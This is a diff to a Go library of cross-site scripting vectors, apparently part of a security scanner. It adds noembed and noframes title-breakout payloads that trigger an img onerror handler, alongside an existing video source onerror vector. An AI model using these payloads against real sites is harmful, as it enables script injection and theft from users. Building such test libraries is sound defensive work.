@@ -97,6 +97,18 @@ var Library = []LibraryVector{
 		Why: "the parser closes noscript at the title's markup, exposing the img",
 	},
 	{
+		ID: "noembed_title_breakout", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: `<>="`,
+		Build: func(m string) string { return fmt.Sprintf(`<noembed><p title="</noembed><img src=x onerror=%s>">`, m) },
+		Why:   "noembed consumes markup like noscript; the parser resumes at the title boundary",
+	},
+	{
+		ID: "noframes_title_breakout", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: `<>="`,
+		Build: func(m string) string {
+			return fmt.Sprintf(`<noframes><p title="</noframes><img src=x onerror=%s>">`, m)
+		},
+		Why: "noframes is another consuming element with the same parser exit",
+	},
+	{
 		ID: "video_source_onerror", Contexts: []Context{CtxHTMLText}, Trigger: TriggerLoad, Needs: "<=>",
 		Build: func(m string) string { return fmt.Sprintf(`<video><source onerror=%s>`, m) },
 		Why:   "a video source that fails to load fires the handler without interaction",
